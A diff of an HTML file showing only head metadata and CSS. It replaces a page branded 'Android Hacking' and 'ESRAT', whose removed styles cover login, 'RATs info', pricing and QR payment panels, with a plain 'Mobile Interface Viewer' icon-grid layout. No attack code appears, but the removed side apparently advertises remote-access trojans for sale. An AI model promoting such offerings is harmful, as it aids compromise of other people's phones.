@@ -2,2080 +2,351 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <!-- PWA Meta Tags -->
-    <meta name="apple-mobile-web-app-capable" content="yes">
-    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <meta name="apple-mobile-web-app-title" content="Android Rats">
-    <meta name="application-name" content="Android Hacking">
-    <link rel="manifest" href="/ESRAT/manifest.json">
-    <link rel="icon" href="https://raw.githubusercontent.com/esrat404/esrat/a0f17e29d2a0996159d0306b6f3aac5e9b561e63/img/logo.png" type="image/x-icon">
-    <link rel="stylesheet" href="https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css">
-    <title>Android Hacking (Android, iOS & Windows) 🎮</title>
-    <meta name="description" content="Welcome, Where AI&ML meets Creativity ! || Get WIN, iOS, Android H@CKS!">
-    <meta name="keywords" content="android rats, hacking, android hack, ganga hacks, hacker ganga, esrat, es ganga, ethical hacking, github, esrat git, hacker">
-    <script type="application/ld+json">
-    {
-      "@context": "https://schema.org",
-      "@type": "WebSite",
-      "name": "ESRAT",
-      "url": "https://es-universe.github.io/ESRAT/",
-      "description": "Get exclusive Android mods, hacking tools, AI utilities, and more built by GANGA.",
-      "sameAs": [
-        "https://github.com/ES-UNIVERSE",
-        "https://www.instagram.com/urstruly_ganga/"
-      ]
-    }
-    </script>
-    <meta property="og:title" content="GANGA's H@CK ZONE – Android, iOS, AI Tools & More!">
-    <meta property="og:description" content="Get exclusive hacks, tools, and AI utilities crafted by ethical hacker GANGA. 🔐">
-    <meta property="og:image" content="https://raw.githubusercontent.com/esrat404/esrat/a0f17e29d2a0996159d0306b6f3aac5e9b561e63/img/logo.png">
-    <meta property="og:url" content="https://es-universe.github.io/ESRAT/">
-    <meta property="og:type" content="website">
-    <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:title" content="GANGA's H@CK ZONE – Android, iOS, AI Tools & More!">
-    <meta name="twitter:description" content="Hacks, Mods, and AI Tools built by ethical hacker GANGA.">
-    <meta name="twitter:image" content="https://raw.githubusercontent.com/esrat404/esrat/a0f17e29d2a0996159d0306b6f3aac5e9b561e63/img/logo.png">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mobile Interface Viewer - ES3000</title>
     <style>
-        /* Reset and Base Styles */
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
-        html {
-            scroll-behavior: smooth;
-            height: 100%;
-            overflow: hidden;
-        }
+
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
-            background: linear-gradient(135deg, #f0f0f0 0%, #ffffff 100%);
-            height: 100vh;
-            overflow: hidden;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            /* Use the background for the whole page */
+            background: linear-gradient(to bottom right, #0f172a, #1e293b, #0f172a);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column; /* Stack content vertically */
+            align-items: center;
+            padding: 0; /* Remove body padding */
             position: relative;
-            color: #333;
         }
-        .login-page {
+
+        /* Full-screen background layer */
+        .bg-layer {
+            position: fixed; /* Fixed to cover the whole viewport */
+            inset: 0;
+            background-image: url('https://files.manuscdn.com/user_upload_by_module/session_file/310519663129718415/fCigMKamjGhQSCGz.jpg');
+            background-size: cover;
+            background-position: center;
+            filter: blur(20px);
+            opacity: 0.6;
+            z-index: 0;
+            transform: scale(1.1);
+        }
+
+        .overlay {
+            position: fixed; /* Fixed to cover the whole viewport */
+            inset: 0;
+            background: rgba(0, 0, 0, 0.6);
+            z-index: 1; /* Below the main content */
+        }
+
+        /* Main content wrapper to keep it centered and readable */
+        .main-content-wrapper {
+            position: relative;
+            z-index: 10;
+            width: 100%;
+            max-width: 600px; /* Increased max-width for a better desktop/frameless view */
             min-height: 100vh;
             display: flex;
             flex-direction: column;
-            overflow: hidden;
+            padding: 20px;
         }
-        /* ✨ UPGRADED LOGO CONTAINER — Smooth Frosted Glass with Inner Glow */
-        .logo-container {
-            position: absolute;
-            top: 40px;
-            left: 50%;
-            transform: translateX(-50%);
+
+        .status-bar {
+            background: linear-gradient(to right, #dc2626, #eab308, #a855f7);
+            height: 60px;
             display: flex;
             align-items: center;
-            justify-content: center;
-            backdrop-filter: blur(32px);
-            -webkit-backdrop-filter: blur(32px);
-            background: rgba(255, 255, 255, 0.4);
-            padding: 14px 24px;
-            border-radius: 36px;
-            box-shadow: 
-                0 8px 32px rgba(0, 0, 0, 0.06),
-                inset 0 0 0 1px rgba(255, 255, 255, 0.4);
-            z-index: 1000;
-            transition: all 0.35s cubic-bezier(0.25, 0.8, 0.25, 1);
-            border: 1px solid rgba(255, 255, 255, 0.35);
+            justify-content: space-between;
+            padding: 0 30px;
+            color: white;
+            font-weight: bold;
+            font-size: 18px;
+            letter-spacing: 3px;
+            border-radius: 12px 12px 0 0; /* Rounded top corners for the app header */
         }
-        .logo-link {
-            display: block;
-            transition: transform 0.3s ease;
+
+        .status-bar .title {
+            font-size: 18px;
         }
-        .logo-link:hover {
-            transform: scale(1.06);
-        }
-        .logo-img {
-            height: 62px;
-            width: auto;
-            filter: drop-shadow(0 4px 12px rgba(0, 0, 0, 0.12));
-            transition: filter 0.3s ease;
-        }
-        .logo-link:hover .logo-img {
-            filter: drop-shadow(0 6px 16px rgba(0, 0, 0, 0.18));
-        }
-        /* Main Content */
-        .main-content {
+
+        .status-bar .subtitle {
+            font-size: 11px;
+            text-align: center;
             flex: 1;
+        }
+
+        .content {
+            flex: 1;
+            background: rgba(0, 0, 0, 0.4);
+            backdrop-filter: blur(10px);
+            overflow-y: auto;
+            display: flex;
+            flex-direction: column;
+            padding-bottom: 20px; /* Add padding at the bottom of the content area */
+        }
+
+        .header-text {
+            text-align: center;
+            padding: 20px;
+            color: #22d3ee;
+            font-size: 14px;
+            border-bottom: 1px solid rgba(34, 211, 238, 0.2);
+            font-family: 'Courier New', monospace;
+            font-size: 16px;
+        }
+
+        .icon-grid {
+            padding: 20px;
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 16px;
+            flex: 1;
+        }
+
+        .icon-button {
             display: flex;
             flex-direction: column;
             align-items: center;
-            justify-content: flex-start;
-            padding: 160px 20px 100px;
-            min-height: 100vh;
-            overflow-y: auto;
-            overflow-x: hidden;
-            background: linear-gradient(135deg, #f0f0f0 0%, #ffffff 100%);
+            gap: 8px;
+            padding: 12px;
+            border-radius: 12px;
+            border: none;
+            background: transparent;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            color: white;
         }
-        /* Animated GANGA Text */
-        .info {
-            text-align: center;
-            margin-bottom: 40px;
-            z-index: 10;
+
+        .icon-button:hover {
+            background: rgba(71, 85, 105, 0.5);
+            transform: scale(1.05);
         }
-        #dynamic-text {
-            font-size: clamp(2.5rem, 8vw, 5rem);
-            font-weight: 700;
-            color: #ffffff;
-            text-shadow: 0 0 20px rgba(0, 0, 0, 0.3);
-            letter-spacing: 0.1em;
-            position: relative;
+
+        .icon-button.selected {
+            background: rgba(71, 85, 105, 0.8);
+            box-shadow: 0 0 0 2px #22d3ee;
+            transform: scale(1.05);
         }
-        .letter {
-            display: inline-block;
-            opacity: 0;
-            transform: translate3d(0px, 50px, 0px) rotate(-15deg) scale(0.8);
-            animation: animateText 1.2s forwards ease-out, glowingShadow 4s infinite ease-in-out;
-        }
-        .letter:nth-child(1) { animation-delay: 0s, 0s; }
-        .letter:nth-child(2) { animation-delay: 0.2s, 0.2s; }
-        .letter:nth-child(3) { animation-delay: 0.4s, 0.4s; }
-        .letter:nth-child(4) { animation-delay: 0.6s, 0.6s; }
-        .letter:nth-child(5) { animation-delay: 0.8s, 0.8s; }
-        @keyframes animateText {
-            0% {
-                opacity: 0;
-                transform: translate3d(0px, 50px, 0px) rotate(-15deg) scale(0.8);
-            }
-            100% {
-                opacity: 1;
-                transform: translate3d(0px, 0px, 0px) rotate(0deg) scale(1);
-            }
-        }
-        @keyframes glowingShadow {
-            0%, 100% {
-                text-shadow: 
-                    0 0 10px rgba(44, 62, 80, 0.3),
-                    0 0 20px rgba(44, 62, 80, 0.2),
-                    0 0 30px rgba(44, 62, 80, 0.1);
-            }
-            50% {
-                text-shadow: 
-                    0 0 20px rgba(44, 62, 80, 0.5),
-                    0 0 40px rgba(44, 62, 80, 0.3),
-                    0 0 60px rgba(44, 62, 80, 0.2);
-            }
-        }
-        /* Notice Board */
-        .notice-board {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: rgba(0, 0, 0, 0.8);
-            backdrop-filter: blur(10px);
-            z-index: 2000;
+
+        .icon-badge {
+            width: 48px;
+            height: 48px;
+            border-radius: 12px;
+            display: flex;
             align-items: center;
             justify-content: center;
-            padding: 20px;
-        }
-        .notice-content {
-            background: linear-gradient(135deg, #ff6b6b, #ee5a52);
             color: white;
-            padding: 40px;
-            border-radius: 20px;
-            text-align: center;
-            max-width: 400px;
-            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
-            animation: slideIn 0.5s ease-out;
-        }
-        .notice-content h3 {
-            font-size: 1.5rem;
-            margin-bottom: 20px;
             font-weight: 600;
-        }
-        .notice-content p {
-            font-size: 1rem;
-            line-height: 1.6;
-            margin-bottom: 20px;
-        }
-        .notice-credentials {
-            background: rgba(255, 255, 255, 0.2);
-            padding: 15px;
-            border-radius: 10px;
-            margin-top: 20px;
-        }
-        .notice-credentials p {
-            margin: 5px 0;
-            font-size: 0.9rem;
-        }
-        .notice-credentials span {
-            font-weight: bold;
-            color: #fff;
-        }
-        @keyframes slideIn {
-            from {
-                opacity: 0;
-                transform: translateY(-50px) scale(0.9);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0) scale(1);
-            }
-        }
-        /* Login Container */
-        .container {
-            margin-bottom: 80px;
-            z-index: 10;
-        }
-        .login-card {
-            background: rgba(255, 255, 255, 0.95);
-            backdrop-filter: blur(20px);
-            -webkit-backdrop-filter: blur(20px);
-            border: 1px solid rgba(255, 255, 255, 0.3);
-            border-radius: 50px;
-            padding: 40px;
-            width: 350px;
-            max-width: 90vw;
-            box-shadow: 
-                0 12px 40px rgba(0, 0, 0, 0.1),
-                inset 0 1px 0 rgba(255, 255, 255, 0.5);
-            transition: all 0.3s ease;
-            animation: cardFloat 6s ease-in-out infinite;
-            margin-top: 20px;
-        }
-        .login-card:hover {
-            transform: translateY(-5px);
-            box-shadow: 
-                0 20px 50px rgba(0, 0, 0, 0.15),
-                inset 0 1px 0 rgba(255, 255, 255, 0.6);
-        }
-        @keyframes cardFloat {
-            0%, 100% {
-                transform: translateY(0px);
-            }
-            50% {
-                transform: translateY(-10px);
-            }
-        }
-        .login-title {
-            text-align: center;
-            font-size: 1.8rem;
-            font-weight: 600;
-            color: #2c3e50;
-            margin-bottom: 30px;
-            letter-spacing: -0.02em;
-        }
-        .input-group {
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
+            transition: all 0.2s ease;
             position: relative;
-            margin-bottom: 25px;
+            overflow: hidden;
         }
-        .login-input {
-            width: 100%;
-            padding: 16px 0;
-            font-size: 1rem;
-            color: #2c3e50;
-            background: transparent;
-            border: none;
-            outline: none;
-            border-bottom: 2px solid rgba(44, 62, 80, 0.2);
-            transition: all 0.3s ease;
-            font-family: inherit;
+
+        .icon-button:hover .icon-badge {
+            box-shadow: 0 6px 16px rgba(0, 0, 0, 0.4);
         }
-        .login-input:focus {
-            border-bottom-color: #3498db;
+
+        .icon-label {
+            font-size: 11px;
+            text-align: center;
+            font-weight: 500;
+            line-height: 1.2;
+            max-width: 100%;
+            word-break: break-word;
         }
-        .login-input:focus + .input-line,
-        .login-input:not(:placeholder-shown) + .input-line {
-            transform: scaleX(1);
-        }
-        .input-line {
-            position: absolute;
-            bottom: 0;
-            left: 0;
-            width: 100%;
-            height: 2px;
-            background: linear-gradient(90deg, #3498db, #2980b9);
-            transform: scaleX(0);
-            transition: transform 0.3s ease;
-            transform-origin: left;
-        }
-        .login-input::placeholder {
-            color: rgba(44, 62, 80, 0.5);
-            transition: color 0.3s ease;
-        }
-        .login-input:focus::placeholder {
-            color: rgba(44, 62, 80, 0.3);
-        }
-        .login-input:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-        }
-        /* Login Button */
-        .login-button {
-            width: 100%;
+
+        .info-panel {
+            margin-top: 20px;
+            background: rgba(30, 41, 59, 0.5);
+            backdrop-filter: blur(10px);
+            border-radius: 0 0 12px 12px; /* Rounded bottom corners for the info panel */
             padding: 16px;
-            font-size: 1rem;
-            font-weight: 600;
-            color: white;
-            background: linear-gradient(135deg, #3498db, #2980b9);
-            border: none;
-            border-radius: 25px;
-            cursor: pointer;
-            position: relative;
-            overflow: hidden;
-            transition: all 0.3s ease;
-            margin-top: 20px;
-            font-family: inherit;
-            letter-spacing: 0.02em;
-        }
-        .login-button:hover:not(:disabled) {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 25px rgba(52, 152, 219, 0.4);
-        }
-        .login-button:active:not(:disabled) {
-            transform: translateY(0);
-        }
-        .login-button:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-            transform: none;
-            box-shadow: none;
-        }
-        .button-glow {
-            position: absolute;
-            top: 0;
-            left: -100%;
+            border: 1px solid #334155;
             width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
-            transition: left 0.6s ease;
         }
-        .login-button:hover:not(:disabled) .button-glow {
-            left: 100%;
-        }
-        .button-text {
-            position: relative;
-            z-index: 1;
-        }
-        .message {
-            text-align: center;
-            margin-top: 15px;
-            font-size: 0.9rem;
-            color: #27ae60;
-            opacity: 0;
-            transition: opacity 0.3s ease;
-        }
-        .message.show {
-            opacity: 1;
-        }
-        /* === NEW SECTION: Android RATs Info === */
-        .rats-info-section {
-            width: 100%;
-            max-width: 600px;
-            margin: 20px auto 40px;
-            text-align: center;
-            z-index: 10;
-            display: flex;
-            justify-content: center;
-            gap: 12px;
-            flex-wrap: wrap;
-        }
-        .rats-toggle-btn,
-        #preview-rat {
-            background: rgba(255, 255, 255, 0.95);
-            backdrop-filter: blur(20px);
-            -webkit-backdrop-filter: blur(20px);
-            border: 1px solid rgba(255, 255, 255, 0.3);
-            color: #2c3e50;
-            padding: 12px 24px;
-            border-radius: 20px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            box-shadow: 0 6px 20px rgba(0,0,0,0.08);
-            font-size: 1rem;
-            display: inline-block;
-        }
-        .rats-toggle-btn:hover,
-        #preview-rat:hover {
-            background: rgba(52, 152, 219, 0.1);
-            transform: translateY(-2px);
-            box-shadow: 0 8px 25px rgba(52, 152, 219, 0.2);
-        }
-        .rats-content {
-            max-height: 0;
-            overflow: hidden;
-            opacity: 0;
-            transition: max-height 0.4s ease, opacity 0.3s ease;
-            background: rgba(255, 255, 255, 0.95);
-            backdrop-filter: blur(20px);
-            -webkit-backdrop-filter: blur(20px);
-            border: 1px solid rgba(255, 255, 255, 0.3);
-            border-radius: 20px;
-            padding: 0 20px;
-            margin-top: 10px;
-            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
-        }
-        .rats-content.expanded {
-            max-height: 500px;
-            opacity: 1;
-            padding: 25px 20px;
-        }
-        .rats-content h3 {
-            font-size: 1.4rem;
-            color: #2c3e50;
-            margin-bottom: 15px;
-        }
-        .rats-features {
-            text-align: left;
-            margin: 15px 0;
-        }
-        .rats-features ul {
-            list-style: none;
-            padding-left: 0;
-        }
-        .rats-features li {
-            padding: 8px 0;
-            font-size: 0.95rem;
-            color: #2c3e50;
-            display: flex;
-            align-items: flex-start;
-        }
-        .rats-features li::before {
-            content: '✓';
-            color: #27ae60;
-            font-weight: bold;
-            margin-right: 10px;
-            font-size: 1rem;
-            flex-shrink: 0;
-        }
-        .collapse-btn {
-            background: linear-gradient(135deg, #e74c3c, #c0392b);
+
+        .info-panel h3 {
             color: white;
-            border: none;
-            padding: 10px 20px;
-            border-radius: 10px;
             font-weight: 600;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            margin-top: 15px;
-            font-size: 0.95rem;
-        }
-        .collapse-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 6px 20px rgba(231, 76, 60, 0.3);
-        }
-        /* === END NEW SECTION === */
-        /* Pricing Section */
-        .pricing-section {
-            margin-bottom: 40px;
-            z-index: 10;
-        }
-        terms {
-            margin-bottom: 40px;
-            z-index: 10;
-        }
-        .pricing-title {
-            text-align: center;
-            font-size: 1.5rem;
-            font-weight: 600;
-            color: #2c3e50;
-            margin-bottom: 30px;
-            letter-spacing: -0.02em;
-        }
-        .term {
-            margin-bottom: 10px;
-            z-index: 10;
-        }
-        .terms {
-            text-align: center;
-            font-size: 1rem;
-            font-weight: 400;
-            color: #2c3e50;
-            margin-bottom: 15px;
-            letter-spacing: -0.02em;
-        }
-        .pricing-cards {
-            display: flex;
-            gap: 20px;
-            justify-content: center;
-            flex-wrap: wrap;
-            margin-top: 20px;
-        }
-        .pricing-card {
-            background: rgba(255, 255, 255, 0.95);
-            backdrop-filter: blur(20px);
-            -webkit-backdrop-filter: blur(20px);
-            border: 1px solid rgba(255, 255, 255, 0.3);
-            border-radius: 20px;
-            padding: 35px;
-            width: 320px;
-            max-width: 90vw;
-            position: relative;
-            transition: all 0.3s ease;
-            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
-        }
-        .pricing-card:hover {
-            transform: translateY(-8px);
-            box-shadow: 0 16px 48px rgba(0, 0, 0, 0.15);
-        }
-        .pricing-card.featured {
-            border: 2px solid #3498db;
-            transform: scale(1.06);
-        }
-        .pricing-card.featured:hover {
-            transform: scale(1.06) translateY(-8px);
-        }
-        .featured-badge {
-            position: absolute;
-            top: -12px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: linear-gradient(135deg, #3498db, #2980b9);
-            color: white;
-            padding: 6px 20px;
-            border-radius: 20px;
-            font-size: 0.8rem;
-            font-weight: 600;
-            letter-spacing: 0.02em;
-        }
-        .card-header {
-            text-align: center;
-            margin-bottom: 25px;
-        }
-        .plan-name {
-            font-size: 1.3rem;
-            font-weight: 600;
-            color: #2c3e50;
-            margin-bottom: 10px;
-        }
-        .plan-price {
-            display: flex;
-            align-items: baseline;
-            justify-content: center;
             margin-bottom: 8px;
         }
-        .currency {
-            font-size: 1.2rem;
-            font-weight: 500;
-            color: #7f8c8d;
+
+        .info-panel p {
+            color: #cbd5e1;
+            font-size: 14px;
+            line-height: 1.5;
         }
-        .amount {
-            font-size: 3rem;
-            font-weight: 700;
-            color: #2c3e50;
-            margin-left: 4px;
-        }
-        .plan-duration {
-            font-size: 0.9rem;
-            color: #7f8c8d;
-            font-weight: 500;
-        }
-        .card-features {
-            margin-bottom: 25px;
-        }
-        .card-features ul {
-            list-style: none;
-            padding: 0;
-        }
-        .card-features li {
-            padding: 8px 0;
-            font-size: 0.9rem;
-            color: #2c3e50;
-            display: flex;
-            align-items: center;
-        }
-        .card-features li::before {
-            content: '✓';
-            color: #27ae60;
-            font-weight: bold;
-            margin-right: 10px;
-            font-size: 1rem;
-        }
-        .pricing-button {
-            width: 100%;
-            padding: 14px;
-            font-size: 0.95rem;
-            font-weight: 600;
-            color: #3498db;
-            background: transparent;
-            border: 2px solid #3498db;
-            border-radius: 10px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            font-family: inherit;
-            letter-spacing: 0.02em;
-        }
-        .pricing-button:hover {
-            background: #3498db;
-            color: white;
-            transform: translateY(-2px);
-            box-shadow: 0 6px 20px rgba(52, 152, 219, 0.3);
-        }
-        .featured-button {
-            background: linear-gradient(135deg, #3498db, #2980b9);
-            color: white;
-            border: none;
-        }
-        .featured-button:hover {
-            background: linear-gradient(135deg, #2980b9, #1f5f8b);
-            transform: translateY(-2px);
-            box-shadow: 0 8px 25px rgba(52, 152, 219, 0.4);
-        }
-        /* Mobile Pricing: Dynamic Toggle */
-        @media (max-width: 768px) {
-            .pricing-cards {
-                display: none;
-            }
-            .pricing-toggle-container {
-                display: flex;
-                justify-content: center;
-                margin: 30px 0;
-                width: 100%;
-                max-width: 320px;
-                margin: 20px auto;
-            }
-            .pricing-toggle {
-                display: flex;
-                background: rgba(255, 255, 255, 0.95);
-                backdrop-filter: blur(20px);
-                -webkit-backdrop-filter: blur(20px);
-                border: 1px solid rgba(255, 255, 255, 0.3);
-                border-radius: 50px;
-                padding: 5px;
-                box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
-                width: 100%;
-                overflow: hidden;
-            }
-            .pricing-toggle-btn {
-                flex: 1;
-                padding: 12px 16px;
-                border: none;
-                background: transparent;
-                color: #2c3e50;
-                font-size: 0.95rem;
-                font-weight: 600;
-                border-radius: 50px;
-                cursor: pointer;
-                transition: all 0.3s ease;
-                white-space: nowrap;
-                text-align: center;
-            }
-            .pricing-toggle-btn.active {
-                background: linear-gradient(135deg, #3498db, #2980b9);
-                color: white;
-                box-shadow: 0 4px 15px rgba(52, 152, 219, 0.3);
-            }
-            .pricing-toggle-btn:not(.active):hover {
-                background: rgba(255, 255, 255, 0.8);
-            }
-            .pricing-details {
-                text-align: center;
-                margin-top: 30px;
-                padding: 100px;
-                background: rgba(255, 255, 255, 0.95);
-                backdrop-filter: blur(20px);
-                -webkit-backdrop-filter: blur(20px);
-                border: 1px solid rgba(255, 255, 255, 0.3);
-                border-radius: 20px;
-                box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
-            }
-            .plan-name-mobile {
-                font-size: 1.4rem;
-                font-weight: 600;
-                color: #2c3e50;
-                margin-bottom: 8px;
-            }
-            .plan-price-mobile {
-                display: flex;
-                align-items: baseline;
-                justify-content: center;
-                margin-bottom: 10px;
-            }
-            .currency-mobile {
-                font-size: 1.3rem;
-                font-weight: 500;
-                color: #7f8c8d;
-            }
-            .amount-mobile {
-                font-size: 2.8rem;
-                font-weight: 700;
-                color: #2c3e50;
-                margin-left: 4px;
-            }
-            .plan-duration-mobile {
-                font-size: 0.9rem;
-                color: #7f8c8d;
-                font-weight: 500;
-                margin-bottom: 15px;
-            }
-            .card-features-mobile {
-                margin-bottom: 20px;
-            }
-            .card-features-mobile ul {
-                list-style: none;
-                padding: 0;
-            }
-            .card-features-mobile li {
-                padding: 8px 0;
-                font-size: 0.9rem;
-                color: #2c3e50;
-                display: flex;
-                align-items: center;
-                justify-content: center;
-            }
-            .card-features-mobile li::before {
-                content: '✓';
-                color: #27ae60;
-                font-weight: bold;
-                margin-right: 10px;
-                font-size: 1rem;
-            }
-            .pricing-button-mobile {
-                width: 100%;
-                padding: 16px;
-                font-size: 1rem;
-                font-weight: 600;
-                color: white;
-                background: linear-gradient(135deg, #3498db, #2980b9);
-                border: none;
-                border-radius: 25px;
-                cursor: pointer;
-                transition: all 0.3s ease;
-                margin-top: 15px;
-                font-family: inherit;
-                letter-spacing: 0.02em;
-            }
-            .pricing-button-mobile:hover {
-                transform: translateY(-2px);
-                box-shadow: 0 8px 25px rgba(52, 152, 219, 0.4);
-            }
-            /* Mobile: Adjust new RATs section */
-            .rats-info-section {
-                margin: 15px auto 30px;
-            }
-            .rats-content.expanded {
-                padding: 20px 15px;
-            }
-        }
-        /* Social Links */
-        .home-sci2 {
-            position: fixed;
-            bottom: 30px;
-            left: 50%;
-            transform: translateX(-50%);
-            display: flex;
-            gap: 20px;
-            z-index: 1000;
-        }
-        .social-link {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            width: 50px;
-            height: 50px;
-            background: rgba(255, 255, 255, 0.25);
-            backdrop-filter: blur(20px);
-            -webkit-backdrop-filter: blur(20px);
-            border: 1px solid rgba(255, 255, 255, 0.3);
-            border-radius: 50%;
-            color: #2c3e50;
-            font-size: 1.2rem;
-            text-decoration: none;
-            transition: all 0.3s ease;
-            position: relative;
-            overflow: hidden;
-            box-shadow: 0 6px 24px rgba(0,0,0,0.08), 0 0 12px rgba(52, 152, 219, 0.2);
-        }
-        .social-link::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(135deg, #3498db, #2980b9);
-            border-radius: 50%;
-            transform: scale(0);
-            transition: transform 0.3s ease;
-            z-index: -1;
-        }
-        .social-link:hover::before {
-            transform: scale(1);
-        }
-        .social-link:hover {
-            color: white;
-            transform: translateY(-3px);
-            box-shadow: 0 8px 32px rgba(0,0,0,0.1), 0 0 16px rgba(52, 152, 219, 0.3);
-        }
-        .social-link.telegram:hover::before {
-            background: linear-gradient(135deg, #0088cc, #00aaff);
-        }
-        .social-link.instagram:hover::before {
-            background: linear-gradient(135deg, #e1306c, #fd1d1d, #fcb045);
-        }
-        .social-link.github:hover::before {
-            background: linear-gradient(135deg, #333, #24292e);
-        }
-        /* Cursor Shadow Effect */
-        .cursor-shadow {
-            position: fixed;
-            width: 80px;
-            height: 80px;
-            border-radius: 50%;
-            pointer-events: none;
-            z-index: 9999;
-            transform: translate(-50%, -50%);
-            filter: blur(30px);
-            background: rgba(52, 152, 219, 0.3);
-            animation: cursorPulse 3s ease-in-out infinite;
-            transition: all 0.1s ease;
-        }
-        @keyframes cursorPulse {
-            0%, 100% {
-                transform: translate(-50%, -50%) scale(1);
-                opacity: 0.3;
-            }
-            50% {
-                transform: translate(-50%, -50%) scale(1.2);
-                opacity: 0.5;
-            }
-        }
-        /* Payment Window */
-        .payment-window {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: rgba(0, 0, 0, 0.8);
-            backdrop-filter: blur(10px);
-            z-index: 2000;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-        }
-        .payment-container {
-            background: rgba(255, 255, 255, 0.95);
-            border-radius: 20px;
-            padding: 25px;
-            width: 100%;
-            max-width: 400px;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
-            animation: slideIn 0.5s ease-out;
-            max-height: 90vh;
-            overflow-y: auto;
-        }
-        .payment-title {
-            text-align: center;
-            font-size: 1.6rem;
-            font-weight: 600;
-            color: #2c3e50;
-            margin-bottom: 20px;
-        }
-        .payment-form {
-            display: flex;
-            flex-direction: column;
-            gap: 12px;
-        }
-        .payment-info {
-            background: rgba(52, 152, 219, 0.1);
-            padding: 15px;
-            border-radius: 12px;
-            margin-bottom: 15px;
-        }
-        .payment-info h3 {
-            font-size: 1.1rem;
-            color: #2c3e50;
-            margin-bottom: 8px;
-        }
-        .payment-info p {
-            font-size: 0.9rem;
-            color: #2c3e50;
-            margin-bottom: 5px;
-        }
-        .payment-info strong {
-            color: #2980b9;
-        }
-        .qr-container {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            margin: 15px 0;
-        }
-        .qr-code {
-            width: 160px;
-            height: 160px;
-            background: #fff;
-            border-radius: 12px;
-            padding: 10px;
-            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
-            margin-bottom: 10px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            overflow: hidden;
-        }
-        .qr-code img {
-            width: 100%;
-            height: 100%;
-            object-fit: contain;
-        }
-        .download-qr {
-            padding: 8px 18px;
-            background: linear-gradient(135deg, #3498db, #2980b9);
-            color: white;
-            border: none;
-            border-radius: 8px;
-            cursor: pointer;
-            font-weight: 600;
-            transition: all 0.3s ease;
-            margin-top: 8px;
-            font-size: 0.9rem;
-        }
-        .download-qr:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 20px rgba(52, 152, 219, 0.4);
-        }
-        .payment-button {
-            padding: 14px;
-            font-size: 1rem;
-            font-weight: 600;
-            color: white;
-            background: linear-gradient(135deg, #27ae60, #219653);
-            border: none;
-            border-radius: 12px;
-            cursor: pointer;
-            transition: all 0.3s ease;
+
+        .info-panel .selected-text {
+            color: #22d3ee;
+            font-size: 13px;
             margin-top: 12px;
+            font-family: 'Courier New', monospace;
         }
-        .payment-button:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 25px rgba(39, 174, 96, 0.4);
-        }
-        .close-button {
-            position: absolute;
-            top: 15px;
-            right: 15px;
-            background: rgba(0, 0, 0, 0.1);
-            border: none;
-            border-radius: 50%;
-            width: 35px;
-            height: 35px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            cursor: pointer;
-            transition: all 0.3s ease;
-        }
-        .close-button:hover {
-            background: rgba(0, 0, 0, 0.2);
-        }
-        /* Verification Window */
-        .verification-window {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: rgba(0, 0, 0, 0.8);
-            backdrop-filter: blur(10px);
-            z-index: 2000;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-        }
-        .verification-container {
-            background: rgba(255, 255, 255, 0.95);
-            border-radius: 20px;
-            padding: 40px;
-            width: 100%;
-            max-width: 500px;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
-            animation: slideIn 0.5s ease-out;
-            text-align: center;
-        }
-        .verification-icon {
-            font-size: 4rem;
-            color: #27ae60;
-            margin-bottom: 20px;
-        }
-        .verification-title {
-            font-size: 1.8rem;
-            font-weight: 600;
-            color: #2c3e50;
-            margin-bottom: 20px;
-        }
-        .verification-message {
-            font-size: 1rem;
-            color: #2c3e50;
-            line-height: 1.6;
-            margin-bottom: 30px;
-        }
-        /* Responsive Design */
-        @media (max-width: 768px) {
-            .main-content {
-                padding: 120px 15px 90px;
-            }
-            .logo-container {
-                top: 20px;
-                padding: 10px 20px;
-            }
-            .logo-img {
-                height: 54px;
-            }
